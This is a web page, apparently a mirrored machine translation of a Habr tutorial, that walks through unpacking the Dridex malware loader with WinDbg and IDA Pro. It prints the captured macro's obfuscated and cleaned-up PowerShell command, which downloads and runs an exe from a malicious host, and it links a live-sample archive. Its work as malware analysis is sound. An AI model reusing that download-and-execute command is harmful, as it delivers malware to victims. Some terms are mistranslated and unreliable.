@@ -1,0 +1,132 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134228602-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Unpacking: Dridex bootloader</title>
+  <meta name="description" content="Good night friends! In less than a month, we will start the course “Reverse Engineering” , in connection with which we traditionally share useful mate...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="https://quick-geek.github.io/search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <section class="page js-page"><h1>Unpacking: Dridex bootloader</h1><div class="post__text post__text-html js-mediator-article">  Good night friends!  In less than a month, we will start the course <a href="https://otus.pw/pkyB/">“Reverse Engineering”</a> , in connection with which we traditionally share useful material on the topic. <br><br>  Some readers had problems unpacking the bootloader for Dridex (of what was dropped by the macro), so today I will show you an easy way to do this.  Another problem that people face that I cannot solve is the fact that Dridex infectious chains have a very short lifetime, which makes it almost impossible for reverse for most people.  I will explain why. <br><br>  The current chain of infection Dridex has about 4 stages: <br><br><ol><li>  An office document containing a macro runs the powershell script. </li><li>  Powershell script that will load the packaged bootloader from a hacked site or sharepoint and launch it. </li><li>  A packaged loader that unpacks itself and inserts the code into a newly created spoolsrv or svchost process. </li><li>  The implemented process, which will communicate with the loader server, will extract and execute the real binary file of the bot. </li></ol><br><br><img src="https://habrastorage.org/webt/3v/iq/09/3viq096dggamwuubpdx05i10jau.png"><br><br>  The problem for analysts is that there are 2 points of failure at once: the hacked site that hosts the bootloader, you can clear or delete the sharepoint account, or the bootloader server can be stopped (any of them will prevent successful infection).  In addition, the bootloader servers often support the geo-zone (only work if your IP is in the country for which it is intended and is not a VPN), and as soon as the bootloader is publicly loaded, the Dridex group can blacklist it. by permanently blocking anyone who launches it from contacting any C2s (Commercial Cloud Services). <a name="habracut"></a><br><br>  What is surprising about all these “failures” is that they are probably intentional.  Most victims who have received infected email will open it within a few working days, after which most of the people who open the email will analyze the malware, so it’s helpful that everything disappears within a week. <cut></cut><br><br>  In order for readers to understand this lesson in practice, <a href="">here</a> is a zip containing a malicious office document and a packaged bootloader from the same chain, so you don’t need to worry about dead URLs (password: infected).  As for servers with a geofence bootloader, I can't do anything about it, and <b><i>since the bootloader has already been recalled, you will be blacklisted for launching it</i></b> (if you do not know how to bypass the blacklist, follow this lesson in the new VM (virtual machine) and maybe change the IP after). <br><br>  <b>Getting Packaged Loader</b> <br><br>  First of all, you will want to open a malicious document in Word, but do not click "Include Content" for now.  Open the debugger (as usual I use WinDbg), connect it to winword.exe, set a breakpoint at CreateProcessW, resume the process, then click "Enable Content". <br><br><img src="https://habrastorage.org/webt/or/rq/cz/orrqczxfburvnfmszvz3xvjvumk.png"><br><br>  The breakpoint will be reached almost instantly with new Dridex patterns (some virtual machines can be detected, so if the breakpoint doesn't work, consider masking your virtual machine). <br><br>  We want to unload the 1st and 2nd parameters of CreateProcess (respectively, the path to the application and command line parameters), we can do this with the following commands: <br><br>  du / c100 poi (esp + 4) <br><br>  du / c100 poi (esp + 8) <br><br>  Note: the du command resets the null-terminated string, / c 100 sets the maximum column limit, and poi (esp + 4) reads the address pointed to by esp + 4.  The results I received: <br><br>  Application: C: \ Windows \ System32 \ cmd.exe <br><br>  Parameters: “C: \ Windows \ System32 \ cmd.exe” / cp ^ ower ^ she ^ ll -ex ^ ecutio ^ nPol ^ icy ByP ^ ass -NoP ^ rofile -com ^ mand (New-O ^ bject Net.Webclient ). ('Downl' + 'oadfile') .invoke ('ht' + 'tp: //'+'littlwnowern.top/lukaku/','C: \ Users \ Admin \ AppData \ Local \ Temp \ GksagD. exe '); starT-Process' C: \ Users \ Admin \ AppData \ Local \ Temp \ GksagD.exe'; <br><br>  Here we observe how a malicious macro runs cmd.exe with a command to start powershell, traverse the execution policy, and then load and run the executable file.  If we remove the string concatenation and characters that are just baisc obfuscation, we get the following: <br><br>  “C: \ Windows \ System32 \ cmd.exe” / c powershell -executionpolicy bypass -noprofile -command (New-Object Net.Webclient). ('Downloadfile'). Invoke ( <a href="">'http://littlwnowern.top/lukaku/ ',' C: \ Users \ Admin \ AppData \ Local \ Temp \ GksagD.exe '</a> ); start-Process' C: \ Users \ Admin \ AppData \ Local \ Temp \ GksagD.exe'; <br><br>  Now we can simply manually download the exe file from littlwnowern [.] Top / lukaku / (url is now dead, but I downloaded the binary file into the archive as “GksagD.exe.sample”), this is a packaged bootloader. <br><br>  <b>Unpacking the bootloader</b> <br><br>  First we need to enable DEP (Data Execution Prevention) for all applications, the reason for this will be clear later.  To do this, go to “Control Panel”&gt; “System and Security”&gt; “System”&gt; “Advanced System Settings”&gt; “Settings” (in the “Performance” section) -&gt; “Prevent data execution”, then enable DEP for all programs. <br><br><img src="https://habrastorage.org/webt/_q/v8/xz/_qv8xzq_55ooc5mibcp5ynjppto.png"><br><br>  Next, we are going to open the exe file in PE Explorer and set the “Relocation Stripped” flag in the PE header, which will not allow ASLR to load the executable file to a different address each time it is launched, which makes reversing easier. <br><br><img src="https://habrastorage.org/webt/_v/c8/v4/_vc8v461psinmwblyocphco9ctw.png"><br><br><img src="https://habrastorage.org/webt/c1/vc/z_/c1vcz_5p8bl7nujmfdwmtdwjevs.png"><br><br>  Now save the executable file and open it in IDA Pro. <br><br>  Usually, Dridex loaders create the svchost.exe or spoolsv.exe process and inject into it, so we know that unpacked code will likely cause CreateProcess;  To verify this, set a breakpoint at the end of CreateProcessW (in the ret instruction) and press run. <br><br><img src="https://habrastorage.org/webt/vp/xe/q8/vpxeq8xktyh0ta0vhbqeijmub78.png"><br><br>  Once the breakpoint is reached, you should see that GksagD.exe has created a suspended process named svchost.exe or spoolsv.exe, as expected.  If we take one step to return from CreateProcessW back to the code that called it, we will meet with the next. <br><br><img src="https://habrastorage.org/webt/ss/yz/vt/ssyzvtcecn4kufmbze09u5lldyg.png"><br><br>  IDA has fragmented instructions, which means that the code has been changed since the launch of the executable file, which is usually the result of unpacking in place (often malware packers use hollow processes to write unpacked code to another process, true packers unpack the code to the same process). <br><br>  Now we know that at some point the main executable code is being replaced, we can put a breakpoint on the record at the current address, which will be triggered when the code changes. <br><br><img src="https://habrastorage.org/webt/ia/ak/rg/iaakrgesrzqnd0zfpshualzy2_a.png"><br><br>  After that, remove all other breakpoints and restart the process. <br><br><img src="https://habrastorage.org/webt/pd/jr/wp/pdjrwpdovttkqzgtwyuzmvglyio.png"><br><br>  The breakpoint was called from an address outside the main section of the executable files, which means that the packer allocated some of the memory, and then copied some code to take care of replacing the main executable file. <br><br>  If we look at the memory in Process Hacker, we see that it is now readable and writable, but not executable, which is fine, since it means that the packer no longer uses this code. <br><br><img src="https://habrastorage.org/webt/im/ek/q0/imekq0wftsmhp9cdj57vrrzzdau.png"><br><br>  Now about some of the findings of Sherlock's level: we know that the code is executed here later, and the memory is not currently executable, so perhaps at some point it will become executable. <br><br>  The function used to configure memory protection is usually VirtualAlloc, VirtualAllocEx, or NtProtectVirtualMemory.  If you are familiar with the internal components of Windows, you will know that both VirtualAlloc and VirtualAllocEx will call NtProtectVirtualMemory internally, so this is where we set a breakpoint. <br><br>  We could sit and check the call stack each time NtProtectVirtualMemory is called, wait for the corresponding address to be set as executable, then analyze the PE header to find a new entry point, or we could get smarter. <br><br>  We are going to set a conditional breakpoint on NtProtectVirtualMemory using the following script: <br><br><pre><code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(esp+0x10) == 0x20 || Dword(esp+0x10) == 0x40 || Dword(esp+0x10) == 0x10) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(esp+4) == 0xFFFFFFFF) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(Dword(esp+8)) &gt;= 0x400000 &amp;&amp; Dword(Dword(esp+8)) &lt; 0x42e000) { PatchDword(esp+0x10, 0x04); } } } <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> 0;</code> </pre> <br><br>  To do this, go to NtProtectVirtualMemory and set a breakpoint on the first byte, right-click&gt; Change breakpoint, then click the "..." button and paste the script. <br><br>  This script will be executed every time NtProtectVirtualMemory is called, and will do the following: <br><br><ul><li>  Make sure that the page protection parameter (esp + 0x10) is 0x10, 0x20, or 0x40 (aka PAGE_EXECUTE, PAGE_EXECUTRE_READ, PAGE_EXECUTE_READWRITE), which means that the call changes the page protection to executable. </li><li>  Make sure that the target address is in the range of the main executable partition (0x400000 - 0x42e000). </li><li>  Change the security setting to 0x04 (not executable). </li><li>  Return 0 (resume execution instead of interrupting the debugger). </li></ul><br><br>  Let's run and see what happens. <br><br><img src="https://habrastorage.org/webt/ui/cn/qz/uicnqz7mpiyc3nkrvhd40vy8eh4.png"><br><br>  No access violation!  Take some time to enjoy the moment, as this is probably the only serious access violation that you have ever seen ... but why is that good? <br><br>  Our breakpoint script on NtProtectVirtualMemory set all memory as non-executable when the packer tried to set it to executable.  An exception means that everything that the packer has written to memory has now been successfully written, and it is trying to call something in this memory.  If we are lucky, the fact that the packer was writing to memory is an unpacked loader, and the address it was trying to call is the entry point, right? <br><br>  To do this, we will use an amazing tool called processdump ( <a href="http://split-code.com/processdump.html">download link</a> ), which dumps any exe or dll images loaded into the process memory, and packages them back into .exe or .dll files. <br><br>  use “pd32.exe -pid” to dump the process. <br><br>  use "pd32.exe -pid &lt;process id&gt;" to unload the process. <br><br><img src="https://habrastorage.org/webt/3x/xj/ib/3xxjibmercdg5fdliadulrlspuk.png"><br><br>  The number at the end of the file name is the base address of the image in memory, so GksagD_exe_GksagD.exe_400000.exe will be what the packer will be, mapped instead of the old executable file, so we will look at it in IDA. <br><br><img src="https://habrastorage.org/webt/_q/4q/uh/_q4quhwj6ab0c_nk1d98wen9-iy.png"><br><br>  The address of the entry point is the same as the address of the exception; this is the unpacked executable file! <br><br>  <b>Reverse tips</b> <br><br>  The loader is complicated, because all the lines are encrypted and there is no import, but the methods that I described in detail in my Dridex handling guides will work on the loader as well. <br>  Take a look: <br>  <a href="https://www.malwaretech.com/2016/04/lets-analyze-dridex-part-2.html">https://www.malwaretech.com/2016/04/lets-analyze-dridex-part-2.html</a> <br><br>  and <br><br>  <a href="https://www.malwaretech.com/2016/05/lets-analyze-dridex-part-3.html">https://www.malwaretech.com/2016/05/lets-analyze-dridex-part-3.html</a> <br><br>  Note: the boot loader executable is multi-purpose (this is both code that injects svchost / spoolsv, and code embedded in svchost / spoolsv).  If you want to reverse the injection part of the loader, simply open it in IDA and run it.  If you want to reverse the boot part, you need to copy it to system32 and run it from there (be careful that in both cases the bootloader will be deleted by itself after it is executed). <br><br>  If you find the material useful, put a plus, write comments and be sure to sign up for <a href="https://otus.pw/Gtcw/">an open lesson</a> that will be held today! </div><p>Source: <a href="https://habr.com/ru/post/439916/">https://habr.com/ru/post/439916/</a></p>
+<section class="navigation-panel">
+<h4>More articles:</h4>
+<nav><ul class="list-of-pages">
+<li><a href="../439746/index.html">Understand the promises in javascript</a></li>
+<li><a href="../439748/index.html">The digest of interesting materials for the mobile developer # 285 (February 4 - 10)</a></li>
+<li><a href="../439750/index.html">Learn product management - where?</a></li>
+<li><a href="../439752/index.html">Multicore MRI Method</a></li>
+<li><a href="../439754/index.html">Google is going to be engaged in the development of smart watches</a></li>
+<li><a href="../439756/index.html">Why do I need a thermo-acoustic generator?</a></li>
+<li><a href="../439760/index.html">Engineers "twisted" the light in the fiber - a new technology will speed up the transfer of data a hundred times</a></li>
+<li><a href="../439764/index.html">Corporate fruit</a></li>
+<li><a href="../439772/index.html">Writing Unit Tests on Swift for Verifying Asynchronous Tasks</a></li>
+<li><a href="../439778/index.html">The digest of fresh materials from the world of the frontend for the last week No. 351 (February 4 - 10, 2019)</a></li>
+<li><a href="../439780/index.html">PHP Digest number 149 (January 28 - February 11, 2019)</a></li>
+<li><a href="../439782/index.html">Headless CMS - the future of content management</a></li>
+<li><a href="../439784/index.html">Methane engine "Raptor" broke the record RD-180</a></li>
+<li><a href="../439788/index.html">Regular oddities in the GOST Grasshopper and Stribog algorithms</a></li>
+<li><a href="../439790/index.html">Test JaCarta WebClient or store tokens in a safe</a></li>
+<li><a href="../439792/index.html">NASA is looking for partners in the American industry to create a partially reusable manned lender</a></li>
+<li><a href="../439794/index.html">Back pain - understanding from the perspective of modern medicine</a></li>
+<li><a href="../439796/index.html">Spring Boot 2: what is not written in release notes</a></li>
+<li><a href="../439800/index.html">RISEX and Julia. 5 stages of love customer and designer</a></li>
+<li><a href="../439806/index.html">Valid SSL domain names for local Docker containers</a></li>
+<li><a href="../439808/index.html">The biggest telescopes. From a notebook and eyes to 340 megapixel cameras and data centers. Part 1</a></li>
+<li><a href="../439810/index.html">Get acquainted with the Moleculer microservice framework</a></li>
+<li><a href="../439816/index.html">Practical blockchain in business</a></li>
+<li><a href="../439818/index.html">Features of approaches to design in the real manufacturing sector</a></li>
+<li><a href="../439820/index.html">We are trying to write a project alone. Introduction</a></li>
+<li><a href="../439822/index.html">Creating an alternative display for the Ensoniq EPS16 + and ASR10 synthesizer / sampler</a></li>
+<li><a href="../439824/index.html">When will the JavaScript frameworks disappear?</a></li>
+<li><a href="../439826/index.html">Disable analog. What will happen to the TV?</a></li>
+<li><a href="../439828/index.html">The network appeared "analog" Findface</a></li>
+<li><a href="../439840/index.html">Conference DUMP-2019: we invite you to speak in the sections Design, Management and Testing</a></li>
+<li><a href="../439852/index.html">Remote control application release: Aspia 1.1.0</a></li>
+<li><a href="../439858/index.html">Prometheus + Grafana + Node Exporter + Docker in Azure with notifications in Telegram</a></li>
+<li><a href="../439862/index.html">Digital events in Moscow from February 11 to 17</a></li>
+<li><a href="../439866/index.html">Principles of design reference books in 1C Enterprise Management 2 (ERP 2.4.6)</a></li>
+<li><a href="../439868/index.html">Life without Facebook: less radical views, good mood, more time for loved ones. Now proven by science</a></li>
+<li><a href="../439878/index.html">Creation of architecture for a new high-load startup in 2019</a></li>
+<li><a href="../439880/index.html">Security Week 07: Local IoT Device Vulnerabilities</a></li>
+<li><a href="../439886/index.html">How I trained the neural network to implement the position estimation function on the Russian AI Cup CodeBall 2018</a></li>
+<li><a href="../439894/index.html">How easy it is to monitor the site</a></li>
+<li><a href="../439900/index.html">Julia and the method of coordinate descent</a></li>
+<li><a href="../439902/index.html">Explaining the physical essence of the Wing Lift phenomenon without using the Bernouli equation. Part 2</a></li>
+<li><a href="../439906/index.html">Critical vulnerability in Zemana products and not only</a></li>
+<li><a href="../439908/index.html">Kohl, piss off ... Coax</a></li>
+<li><a href="../439912/index.html">Unsolved mystery of view</a></li>
+<li><a href="../439916/index.html">Unpacking: Dridex bootloader</a></li>
+<li><a href="../439922/index.html">Taxation of IP in Kazakhstan how to be a freelancer?</a></li>
+<li><a href="../439924/index.html">The volume of parcels from foreign online stores grew by 25%</a></li>
+</ul></nav>
+</section>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52319614 = new Ya.Metrika({
+                  id:52319614,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52319614" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134228602-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+</body>
+
+</html>
